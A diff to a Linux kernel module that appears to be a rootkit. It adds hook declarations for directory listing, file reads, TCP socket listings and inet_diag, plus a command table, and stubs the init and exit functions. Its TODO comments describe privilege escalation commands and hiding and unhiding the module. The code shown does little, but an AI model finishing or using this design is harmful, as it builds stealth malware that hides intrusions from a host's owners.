@@ -5,6 +5,14 @@
 #include <linux/module.h>
 #include <linux/printk.h>
 
+extern struct kretprobe rk_mkdir_probe;
+extern struct kretprobe rk_mkdirat_probe;
+extern struct kretprobe rk_getdents_probe;
+extern struct kretprobe rk_read_probe;
+extern struct kretprobe rk_tcp4_probe;
+extern struct kretprobe rk_tcp6_probe;
+extern struct kretprobe rk_inet_diag_probe;
+
 static struct kretprobe *probes[] = {
 	&rk_mkdir_probe,
 	&rk_mkdirat_probe,
@@ -29,33 +37,32 @@ static int cmd_status(const char *arg)
 	return 0;
 }
 
+/* Agent lifecycle controls need a successful kernel-side acknowledgement.
+ * The agent owns presentation/listing and connection teardown. */
+static int cmd_agent_control(const char *arg)
+{
+	return 0;
+}
+
+static const struct rk_cmd_entry init_cmds[] = {
+	{ "ping",   cmd_ping },
+	{ "status", cmd_status },
+	{ "list",   cmd_agent_control },
+	{ "quit",   cmd_agent_control },
+};
+
 static int __init rk_init(void)
 {
-	int ret;
-
-	rk_target_init(&rk_file_targets);
-	rk_target_init(&rk_pid_targets);
-	rk_target_init(&rk_content_targets);
-	rk_target_init(&rk_port_targets);
-
-	ret = rk_cmd_register("ping", cmd_ping);
-	if (ret)
-		return ret;
-	ret = rk_cmd_register("status", cmd_status);
-	if (ret)
-		return ret;
-
-	// TODO: register subsystem commands (escalation, module, filter)
-	// TODO: request_module("inet_diag") before resolving the probe table
-
-	// TODO: register kretprobes from probes[] table (goto rollback on failure)
-
-	return 0;
+	// TODO: initialize target ownership, register all command providers, request
+	// inet_diag, then register every probe. On a probe failure, unwind only the
+	// successfully registered prefix in reverse order and return the real error.
+	return -EOPNOTSUPP;
 }
 
 static void __exit rk_exit(void)
 {
-	// TODO: unhide module and unregister probes in reverse
+	// TODO: restore module visibility, unregister the registered probes in
+	// reverse order, and log the completed unload.
 }
 
 module_init(rk_init);
